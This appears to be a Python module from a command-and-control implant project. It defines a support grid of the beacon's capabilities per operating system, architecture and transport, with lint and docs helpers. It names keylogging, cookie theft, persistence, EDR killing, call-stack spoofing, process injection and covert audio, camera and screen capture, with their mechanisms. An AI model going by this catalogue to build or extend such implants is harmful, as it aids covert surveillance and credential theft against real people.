"""beacon_matrix.py — the feature × OS × arch × transport GRID, in ONE place.

The audit's finding was precise: "Build/artefatto corretti per 4 OS; la verifica
è per build, non per feature. Nessuna griglia feature × OS × arch × transport."
The CI jobs proved a binary was produced; they said nothing about WHICH
capabilities that binary carries on WHICH platform, so a whole feature could
silently become Windows-only (exactly what happened before
``test_beacon_arsenal_parity``) and every job stayed green.

This module is the grid. It is DATA plus the rules that read it, and nothing
here builds or executes anything:

* :data:`FEATURES` — every beacon capability with the verbs it dispatches, the
  header(s) that implement it, and one support level per OS;
* :data:`ARCHES` / :data:`TRANSPORTS` / :data:`PINS` — the other two axes, per
  OS, so ``(os, arch, transport)`` is a CELL and not a slogan;
* :func:`matrix_cells` — every cell the release can ship;
* :func:`support_for` / :func:`runs_on` — the answer for one feature/OS;
* :func:`verbs_on` / :func:`missing_verbs` — which C2 verbs a platform can
  actually dispatch, derived from the grid;
* :func:`to_markdown` — the table the docs page quotes, generated, never
  hand-copied.

The claims are CHECKED, not trusted. ``tests/test_beacon_matrix.py`` derives
the truth it can from the payload itself:

  * every verb ``phantom.core.task_policy.BEACON_VERBS`` sends belongs to
    exactly one feature (a new verb cannot ship without a matrix row);
  * every header in ``payloads/beacon/src`` is classified (feature, helper, or
    documented non-beacon file);
  * a feature the grid calls usable on POSIX must have a non-Windows branch in
    every COMMITTED header it names (``source_headers``; a generated header
    cannot be read in a clean checkout — see :data:`GENERATED_HEADERS`) — the
    header scan that decides this is the same one
    ``test_beacon_arsenal_parity`` uses, so the two cannot disagree;
  * a feature the grid calls ``windows_only`` must live in a header with NO
    non-Windows branch at all.

What is NOT machine-checked is the reverse direction (that a POSIX branch is
USEFUL), and the wording is kept honest for it: ``posix`` means "the same
POSIX path is compiled in", ``degrade`` means "it runs but leans on
Linux-first tooling", ``absent`` means "no path at all". That distinction is
the difference between a contract and a marketing page.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Mapping, Sequence, Tuple

# ---------------------------------------------------------------- OSES

#: The families the payload builder emits (``utils/builder`` BEACON_NAMES).
OSES: Tuple[str, ...] = ("windows", "linux", "macos", "android")

#: Support levels, strongest first. The vocabulary is closed: a reviewer must
#: be able to say what a cell MEANS without reading a header.
SUPPORT_LEVELS: Tuple[str, ...] = (
    "native",        # implemented with the platform's own API / a real path
    "posix",         # the shared POSIX path is compiled in
    "degrade",       # present but limited (Linux-first tooling, honest stub)
    "windows_only",  # NT-specific mechanism, no POSIX analogue
    "absent",        # not implemented for this OS at all
)

#: OS -> the arches the builder can emit for it. Read off ``builder.py``: the
#: Windows path needs MinGW (x86_64, i686 fallback), macOS is compiled with
#: ``-arch arm64`` on Apple silicon (x86_64 on Intel runners), Android is the
#: NDK's ``aarch64-linux-android28`` triple, and Linux is the HOST arch.
ARCHES: Mapping[str, Tuple[str, ...]] = {
    "windows": ("x86_64", "x86"),
    "linux": ("x86_64", "aarch64"),
    "macos": ("arm64", "x86_64"),
    "android": ("aarch64",),
}

#: OS -> the transport the beacon speaks.
TRANSPORTS: Mapping[str, str] = {
    "windows": "winhttp",
    "linux": "openssl",
    "macos": "libcurl",
    "android": "openssl",
}

#: OS -> the pinning primitive, i.e. WHAT the transport can actually check.
#: A pinned endpoint only authenticates the peer if the transport can hash it;
#: macOS pins the public key because libcurl exposes no DER-certificate pin.
PINS: Mapping[str, str] = {
    "windows": "cert-sha256-der",       # CryptHashCertificate(pbCertEncoded)
    "linux": "cert-sha256-der",         # X509_digest(EVP_sha256)
    "macos": "pubkey-spki-sha256",      # CURLOPT_PINNEDPUBLICKEY
    "android": "cert-sha256-der",       # X509_digest(EVP_sha256)
}

#: OS -> (container label, machine the smoke test must find). Kept here so
#: `scripts/beacon_matrix_verify.py` has no second copy of the truth.
FORMAT: Mapping[str, str] = {
    "windows": "PE",
    "linux": "ELF",
    "macos": "Mach-O",
    "android": "ELF",
}

#: OS -> (name, value) the artefact's machine field must carry.
MACHINE: Mapping[str, Tuple[str, int]] = {
    "windows": ("IMAGE_FILE_MACHINE_AMD64", 0x8664),
    "linux": ("EM_X86_64", 0x3E),
    "macos": ("CPU_TYPE_ARM64", 0x0100000C),
    "android": ("EM_AARCH64", 0xB7),
}

#: macOS is the one platform whose DEFAULT can legitimately be the other arch
#: (Intel runners), so the expected machine is per (os, arch) instead.
MACHINE_BY_ARCH: Mapping[Tuple[str, str], Tuple[str, int]] = {
    ("windows", "x86_64"): ("IMAGE_FILE_MACHINE_AMD64", 0x8664),
    ("windows", "x86"): ("IMAGE_FILE_MACHINE_I386", 0x014C),
    ("linux", "x86_64"): ("EM_X86_64", 0x3E),
    ("linux", "aarch64"): ("EM_AARCH64", 0xB7),
    ("macos", "arm64"): ("CPU_TYPE_ARM64", 0x0100000C),
    ("macos", "x86_64"): ("CPU_TYPE_X86_64", 0x01000007),
    ("android", "aarch64"): ("EM_AARCH64", 0xB7),
}

#: Artefact name per OS, as `utils/builder` writes it.
ARTEFACTS: Mapping[str, Tuple[str, ...]] = {
    "windows": ("beacon.pe", "beacon_xored.bin"),
    "linux": ("beacon_linux", "beacon_linux_static", "beacon_linux_raw.bin"),
    "macos": ("beacon_macos",),
    "android": ("beacon_android",),
}

# ------------------------------------------------------------------ features


@dataclass(frozen=True)
class Feature:
    """One beacon capability, across the whole grid."""

    name: str
    kind: str                                   # shell|collection|action|ad|evasion|protocol
    verbs: Tuple[str, ...] = ()                 # C2 verbs that reach it
    headers: Tuple[str, ...] = ()               # src files that implement it
    support: Mapping[str, str] = field(default_factory=dict)
    note: str = ""

    def level(self, os_name: str) -> str:
        return self.support.get(os_name, "absent")

    def on(self, os_name: str) -> bool:
        """Can this capability run on ``os_name`` at all (any level but absent,
        and not a level that only exists on another family)?"""
        level = self.level(os_name)
        if level == "absent":
            return False
        if level == "windows_only":
            return os_name == "windows"
        return True

    def degraded(self, os_name: str) -> bool:
        return self.level(os_name) == "degrade"

    def to_dict(self) -> Dict[str, object]:
        return {"name": self.name, "kind": self.kind, "verbs": list(self.verbs),
                "headers": list(self.headers), "support": dict(self.support),
                "note": self.note}


_NATIVE = {"windows": "native", "linux": "native", "macos": "native",
           "android": "native"}
_POSIX = {"windows": "native", "linux": "posix", "macos": "posix",
          "android": "posix"}
_WINDOWS_ONLY = {"windows": "windows_only", "linux": "absent",
                 "macos": "absent", "android": "absent"}


def _support(**over: str) -> Dict[str, str]:
    base = dict(_POSIX)
    base.update(over)
    return base


#: THE GRID. One row per capability; every C2 verb appears exactly once.
FEATURES: Tuple[Feature, ...] = (
    # ── shell / execution ────────────────────────────────────────────────
    Feature(
        name="shell_exec", kind="shell",
        verbs=("run", "exec", "shell", "kill", "mem-run", "download",
               "upload", "remote", "exit", "sleep", "set-sleep", "health",
               "auth-rotate"),
        headers=("main.cpp", "network.h", "reflective_loader.c",
                 "inmemory.h"),
        support=dict(_NATIVE),
        note="mem-run/remote keep a PIC loader path on POSIX; sleep is a "
             "plain nanosleep where masked sleep is unavailable"),
    Feature(
        name="filesystem", kind="shell",
        verbs=("ls", "cat", "cd", "cd..", "pwd", "dir", "drives", "find"),
        headers=("main.cpp", "recon.h"),
        support=dict(_NATIVE),
        note="drives lists drive letters on Windows, mount points on POSIX"),
    Feature(
        name="process_recon", kind="collection",
        verbs=("processes", "whoami", "sysinfo", "netinfo"),
        headers=("main.cpp",),
        support=dict(_NATIVE),
        note="Windows: Toolhelp32; POSIX: /proc + uname"),
    Feature(
        name="recon_net", kind="collection", verbs=("recon",),
        headers=("recon.h",), support=dict(_NATIVE),
        note="same API, per-OS probes inside the header"),
    Feature(
        name="keylogger", kind="collection", verbs=("keylog",),
        headers=("keylogger.h",), support=dict(_POSIX),
        note="POSIX path reads the input device; needs the right privileges"),

    # ── survivability ────────────────────────────────────────────────────
    Feature(
        name="persistence", kind="action", verbs=("persist", "unpersist"),
        headers=("persistence.h",), support=dict(_POSIX),
        note="Windows: Run key/registry; Linux: systemd user unit/cron; "
             "macOS: launchd"),
    Feature(
        name="edr_awareness", kind="evasion", verbs=("edrcheck",),
        headers=("evasion.h",), support=dict(_NATIVE),
        note="Linux: LSM/eBPF/audit; macOS: SIP + EndpointSecurity; "
             "Android: selinux"),
    Feature(
        name="edr_kill", kind="action", verbs=("edr-kill",),
        headers=("evasion.h",), support=dict(_POSIX),
        note="consumes the shared dfns:: detection, never a private list"),
    Feature(
        name="masked_sleep", kind="evasion", headers=("sleep_mask.h",),
        support=dict(_NATIVE),
        note="Windows: Ekko timer + code/stack RC4; POSIX: ekko_sleep_masked"),
    Feature(
        name="module_hiding", kind="evasion", headers=("peb_unlink.h",),
        support=_support(macos="absent", android="absent"),
        note="POSIX uses the dynamic-loader link_map; dyld is read-only and "
             "bionic exposes no writable link_map, so macOS/Android opt out"),
    Feature(
        name="call_stack_spoof", kind="evasion",
        support=dict(_WINDOWS_ONLY),
        note="unwinder-based EDR evasion (ThreadStackSpoofer) - the "
             "sleepmask::spoof_stack branch INSIDE sleep_mask.h, which is "
             "otherwise a cross-platform header; POSIX unwinding models "
             "differ, so no equivalent is shipped"),
    Feature(
        name="sleep_ekko_timer", kind="evasion",
        headers=("sleep_ekko.h",), support=dict(_WINDOWS_ONLY),
        note="the Ekko timer OBJECT the Windows masked sleep uses; POSIX "
             "runs ekko_sleep_masked from sleep_mask.h instead"),
    Feature(
        name="winhttp_resolver", kind="helper",
        headers=("winhttp_dynamic.h",), support=dict(_WINDOWS_ONLY),
        note="dynamic WinHTTP resolution; POSIX uses libcurl/OpenSSL, which "
             "is a working replacement rather than a gap"),
    Feature(
        name="wasapi_engine", kind="helper",
        headers=("wasapi_capture.h",), support=dict(_WINDOWS_ONLY),
        note="WASAPI audio engine; the cross-platform part of audio lives in "
             "audio.h, which HAS a POSIX capture path"),
    Feature(
        name="nt_syscalls", kind="evasion", headers=("syscalls.h",),
        support=dict(_WINDOWS_ONLY),
        note="direct/indirect NT syscalls; POSIX has no userland hook layer"),
    Feature(
        name="apc_injection", kind="action", headers=("apc_injection.h",),
        support=dict(_WINDOWS_ONLY),
        note="APC is a Windows scheduling primitive"),
    Feature(
        name="ppid_spoof", kind="evasion", headers=("ppid_spoof.h",),
        support=dict(_WINDOWS_ONLY),
        note="PROC_THREAD_ATTRIBUTE_PARENT_PROCESS"),
    Feature(
        name="jpeg_encoder", kind="helper", headers=("jpeg_enc.h",),
        support=dict(_WINDOWS_ONLY),
        note="helper for the Windows GDI capture path only"),

    # ── collection ───────────────────────────────────────────────────────
    Feature(
        name="screenshot", kind="collection",
        verbs=("screenshot", "screen-dump"), headers=("screenshot.h",),
        support=_support(macos="degrade", android="posix"),
        note="Windows GDI; Wayland-first then X11 tools; macOS has no "
             "dedicated path (Linux tools); Android screencap"),
    Feature(
        name="screen_record", kind="collection",
        verbs=("screen-record", "screen-record-live", "screen-stream",
               "screen-stream-stop"),
        headers=("screen_record.h",),
        support=_support(macos="degrade", android="posix"),
        note="Windows gdigrab; X11 x11grab; Android screenrecord"),
    Feature(
        name="camera", kind="collection", verbs=("camera",),
        headers=("camera.h",), support=_support(macos="degrade"),
        note="Windows Media Foundation/WIA; POSIX fswebcam/ffmpeg/v4l2; "
             "Android am IMAGE_CAPTURE"),
    Feature(
        name="audio", kind="collection", verbs=("audio",),
        headers=("audio.h",), support=_support(macos="degrade"),
        note="Windows WASAPI; POSIX arecord/ffmpeg/rec"),
    Feature(
        name="gps", kind="collection", verbs=("gps",), headers=("gps.h",),
        support=_support(macos="degrade"),
        note="Windows WinRT Geolocator; POSIX gpsd/nmcli; Android dumpsys"),
    Feature(
        name="netstat", kind="collection",
        verbs=("netstat", "netstat-json"), headers=("netstat.h",),
        support=_support(macos="degrade"),
        note="Windows iphlpapi; POSIX /proc/net/tcp — macOS has no /proc"),
    Feature(
        name="cookies", kind="collection",
        verbs=("cookies", "cookies-json"), headers=("cookie_stealer.h",),
        support=_support(macos="absent", android="absent"),
        note="Windows DPAPI; POSIX OpenSSL EVP over browser profiles; no "
             "dedicated macOS/Android path"),
    Feature(
        name="wlan", kind="collection",
        verbs=("wlan-scan", "wlan-locate"), headers=("wlan_scan.h",),
        support=_support(android="degrade"),
        note="Windows native WLAN API; POSIX nmcli then iw/iwlist (root or "
             "CAP_NET_ADMIN); Android when the tools are present"),
    Feature(
        name="bluetooth", kind="collection",
        verbs=("bt-scan", "bt-scan-json"), headers=("bt_scan.h",),
        support=_support(android="degrade"),
        note="Windows native; POSIX hcitool/bluetoothctl when present"),

    # ── lateral / pivot ──────────────────────────────────────────────────
    Feature(
        name="browser_pivot", kind="action",
        verbs=("browser-pivot", "browser-pivot-stop", "browser-list"),
        headers=("browser_pivot.h",), support=dict(_POSIX),
        note="Windows Toolhelp32 PID; POSIX /proc/*/comm; a PID is required "
             "on macOS (no /proc)"),
    Feature(
        name="cdp_pivot", kind="action",
        verbs=("cdp-launch", "cdp-nav", "cdp-eval", "cdp-fetch",
               "cdp-cookies"),
        headers=("cdp_pivot.h",), support=dict(_POSIX),
        note="one POSIX path (BSD sockets + websocket), no macOS-specific "
             "path needed"),
    Feature(
        name="socks_proxy", kind="action", verbs=("socks", "socks-stop"),
        headers=("proxy.h",), support=dict(_POSIX),
        note="WinSock on Windows, BSD sockets elsewhere"),
    Feature(
        name="port_forward", kind="action",
        verbs=("portfwd", "portfwd-stop"), headers=("portfwd.h",),
        support=dict(_POSIX), note="same shape as the SOCKS proxy"),
    Feature(
        name="process_injection", kind="action",
        verbs=("inject", "inject-eb", "inject-tl", "migrate"),
        headers=("injection.h",),
        support=_support(macos="degrade"),
        note="Windows: remote thread/early-bird/threadless; Linux: ptrace + "
             "process_vm_writev; macOS has ptrace(2) with different requests, "
             "so the header ships an HONEST stub that returns 'not supported'"),
    Feature(
        name="smb_pipe", kind="action",
        verbs=("smb-pipe", "smb-pipe-stop"), headers=("smb.h",),
        support=dict(_WINDOWS_ONLY),
        note="named-pipe lateral movement, NT-specific"),

    # ── protocol / plumbing (no verb of their own) ───────────────────────
    Feature(
        name="task_lifecycle", kind="protocol", headers=("task_lifecycle.h",),
        support=dict(_NATIVE),
        note="lease + idempotent result + output cap: the same contract on "
             "every OS"),
    Feature(
        name="beacon_auth", kind="protocol",
        headers=("beacon_auth.h", "crypto.h"), support=dict(_NATIVE),
        note="per-beacon HMAC + AES-GCM envelope, same on every OS"),
    Feature(
        name="transport_pinning", kind="protocol",
        headers=("network.h", "c2_config.h"),
        support={"windows": "native", "linux": "native", "macos": "native",
                 "android": "native"},
        note="WinHTTP/BCrypt, OpenSSL, libcurl: DER pin on three, SPKI pin on "
             "macOS because libcurl has no DER pin (the Windows resolver "
             "lives in winhttp_resolver)"),
    Feature(
        name="malleable_profile", kind="protocol",
        headers=("malleable.h", "malleable_config.h"), support=dict(_NATIVE),
        note="profile generation is shared; the wire shape is not per-OS"),
)

#: Headers that are part of the build/glue rather than a capability. Every
#: ``*.h`` in the src dir must appear in FEATURES or here — that is what makes
#: "add a header without classifying it" impossible.
HELPER_HEADERS: Mapping[str, str] = {
    "build_id.h": "build provenance string",
    "c2_config.h": "transport/endpoint configuration struct",
    "config_encrypted.h": "generated: the encrypted config blob",
    "config_encrypted.h.in": "template for the generated config header",
    "crypto_config.h": "generated: the per-beacon crypto material",
    "media_utils.h": "shared temp-file/base64 helpers for the media paths",
    "secure_heap.h": "allocator hardening used by several features",
}

#: Headers under ``src/`` that are WRITTEN AT BUILD TIME and never committed:
#: a fresh clone has none of them, and ``scripts/ci_beacon_prepare.py`` (or the
#: builder) is what puts them on disk before a compile. The grid may still NAME
#: one — a feature can genuinely be implemented against a generated define —
#: but nothing may READ it, and that distinction is the bug this list closes:
#: ``beacon_auth.h`` is written by the CI prepare step and ignored in git, so a
#: scan that read every header a POSIX feature names raised FileNotFoundError
#: on the runner while passing on a developer's disk, where an earlier build
#: had left the file behind. :func:`source_headers` is the read that respects
#: this, and ``tests/test_beacon_matrix.py`` pins it against ``git ls-files``
#: so a newly generated header cannot re-enter a scan in silence.
GENERATED_HEADERS: Mapping[str, str] = {
    "beacon_auth.h": "generated: per-beacon auth identity (ci_beacon_prepare)",
    "c2_config.h": "generated: the endpoint the builder burns in",
    "crypto_config.h": "generated: per-beacon crypto material",
    "build_id.h": "generated: the build provenance string",
    "config_encrypted.h": "generated: the encrypted config blob",
    "malleable_config.h": "generated: the malleable profile the builder embeds",
}

#: Files under src/ that are NOT beacon headers at all (asm/stubs/tests).
NON_HEADER_FILES: Mapping[str, str] = {
    "main.cpp": "the beacon entry point and the ONE command dispatcher",
    "reflective_loader.c": "PIC loader (mem-run on POSIX)",
    "api_resolver.asm": "PEB resolver stub (Windows)",
    "peb_walker.asm": "PEB walker stub (Windows)",
    "pic_bootstrap.asm": "PIC bootstrap (Windows)",
    "reflective_loader.asm": "reflective loader stub (Windows)",
    "reflective_loader_bootstrap.asm": "reflective loader bootstrap (Windows)",
    "syscalls.asm": "syscall stubs (Windows)",
    "test_checkin.cpp": "standalone protocol test, not part of the beacon",
    "test_net.cpp": "standalone transport test, not part of the beacon",
    "test_transport.cpp": "standalone transport test, not part of the beacon",
}

#: macOS/Android lean on Linux-first tooling for these: the cell is real but
#: the operator must not read "posix" as "first-class".
DEGRADED: Mapping[str, Tuple[str, ...]] = {
    os_name: tuple(f.name for f in FEATURES
                   if f.support.get(os_name) == "degrade")
    for os_name in OSES
}


# --------------------------------------------------------------------- reads


def feature(name: str) -> Feature | None:
    for item in FEATURES:
        if item.name == name:
            return item
    return None


def feature_for_verb(verb: str) -> Feature | None:
    """The feature that dispatches ``verb`` (None when the grid has no row)."""
    target = str(verb or "").strip().lower()
    for item in FEATURES:
        if target in item.verbs:
            return item
    return None


def source_headers(item: Feature) -> Tuple[str, ...]:
    """The headers ``item`` names that a FRESH CLONE actually has.

    ``Feature.headers`` may name a generated header — the implementation can
    include a define the build writes (see :data:`GENERATED_HEADERS`) — and a
    scanner cannot read a file that is not there. Every scan reads this, and
    ``tests/test_beacon_matrix.py`` proves the result is git-TRACKED, which is
    the same thing as "present in a clone".
    """
    return tuple(h for h in item.headers if h not in GENERATED_HEADERS)


def support_for(name: str, os_name: str) -> str:
    item = feature(name)
    return item.level(os_name) if item else "absent"


def runs_on(name: str, os_name: str) -> bool:
    item = feature(name)
    return bool(item and item.on(os_name))


def faces() -> Dict[str, Dict[str, str]]:
    """``{feature: {os: level}}`` — the grid as plain data (reports, JSON)."""
    return {item.name: {os_name: item.level(os_name) for os_name in OSES}
            for item in FEATURES}


def verbs_on(os_name: str) -> set:
    """Every verb a beacon of ``os_name`` can dispatch, from the grid."""
    out: set = set()
    for item in FEATURES:
        if item.on(os_name):
            out.update(item.verbs)
    return out


def missing_verbs(os_name: str, verbs: Sequence[str]) -> set:
    """Which of ``verbs`` this OS cannot dispatch (the parity GAP)."""
    return {str(v) for v in verbs} - verbs_on(os_name)


def matrix_cells() -> List[Tuple[str, str, str]]:
    """Every ``(os, arch, transport)`` cell the builder can ship."""
    return [(os_name, arch, TRANSPORTS[os_name])
            for os_name in OSES for arch in ARCHES[os_name]]


def machine_for(os_name: str, arch: str) -> Tuple[str, int]:
    """(name, value) the artefact's machine field must carry for that cell."""
    return MACHINE_BY_ARCH.get((os_name, arch), MACHINE.get(os_name, ("?", 0)))


def pin_primitive(os_name: str) -> str:
    return PINS.get(os_name, "")


def matrix_errors(verbs: Sequence[str] = ()) -> List[str]:
    """Every way the grid is malformed, as human strings.

    Used by the test suite AND by ``scripts/beacon_matrix_verify.py --lint`` so
    a broken grid fails in one place with one message, whether it is caught
    offline or on a runner.
    """
    errors: List[str] = []
    seen_verbs: Dict[str, str] = {}
    seen_names: set = set()
    for item in FEATURES:
        if item.name in seen_names:
            errors.append(f"duplicate feature name {item.name!r}")
        seen_names.add(item.name)
        if set(item.support) != set(OSES):
            errors.append(f"{item.name}: support must name all of {OSES}, "
                          f"got {sorted(item.support)}")
        for os_name, level in item.support.items():
            if level not in SUPPORT_LEVELS:
                errors.append(f"{item.name}/{os_name}: unknown level {level!r}")
            if level == "windows_only" and os_name != "windows":
                errors.append(f"{item.name}/{os_name}: windows_only is only "
                              f"meaningful on windows")
        for verb in item.verbs:
            if verb in seen_verbs:
                errors.append(f"verb {verb!r} claimed by {seen_verbs[verb]} "
                              f"and {item.name}")
            seen_verbs[verb] = item.name
    if verbs:
        wanted = {str(v) for v in verbs}
        unknown = sorted(wanted - set(seen_verbs))
        if unknown:
            errors.append(f"verbs with no feature row: {unknown}")
        extra = sorted(set(seen_verbs) - wanted)
        if extra:
            errors.append(f"features claim verbs the beacon does not "
                          f"dispatch: {extra}")
    for os_name in OSES:
        if not ARCHES.get(os_name):
            errors.append(f"{os_name}: no arch declared")
        if not TRANSPORTS.get(os_name):
            errors.append(f"{os_name}: no transport declared")
        if not PINS.get(os_name):
            errors.append(f"{os_name}: no pin primitive declared")
        if FORMAT.get(os_name) != ({"windows": "PE", "macos": "Mach-O"}
                                   .get(os_name, "ELF")):
            errors.append(f"{os_name}: unexpected container {FORMAT.get(os_name)}")
        for arch in ARCHES.get(os_name, ()):
            if (os_name, arch) not in MACHINE_BY_ARCH:
                errors.append(f"{os_name}/{arch}: no machine value declared")
    return errors


# ------------------------------------------------------------------ markdown

_BEGIN = "<!-- beacon-matrix:begin -->"
_END = "<!-- beacon-matrix:end -->"


def to_markdown() -> str:
    """The grid as the docs page quotes it (generated, never hand-copied)."""
    head = ("| Feature | Kind | Windows | Linux | macOS | Android | Verbs |")
    rule = "|---|---|---|---|---|---|---|"
    rows = [head, rule]
    for item in FEATURES:
        cells = []
        for os_name in OSES:
            level = item.level(os_name)
            cells.append(level if level != "degrade" else "posix (degrade)")
        verbs = ", ".join(f"`{v}`" for v in item.verbs) or "—"
        rows.append(f"| {item.name} | {item.kind} | " + " | ".join(cells)
                    + f" | {verbs} |")
    cells = ["| OS | arches | transport | pin | container | artefact |",
             "|---|---|---|---|---|---|"]
    for os_name in OSES:
        cells.append(f"| {os_name} | " + ", ".join(f"`{a}`"
                     for a in ARCHES[os_name])
                     + f" | `{TRANSPORTS[os_name]}` | `{PINS[os_name]}` "
                       f"| {FORMAT[os_name]} "
                       f"| `{ARTEFACTS[os_name][0]}` |")
    return _BEGIN + "\n" + "\n".join(rows + [""] + cells) + "\n" + _END


def markdown_block(doc_text: str) -> str:
    """The generated block as it appears in ``doc_text`` (\"\" if missing)."""
    if _BEGIN not in doc_text or _END not in doc_text:
        return ""
    start = doc_text.index(_BEGIN)
    end = doc_text.index(_END) + len(_END)
    return doc_text[start:end]
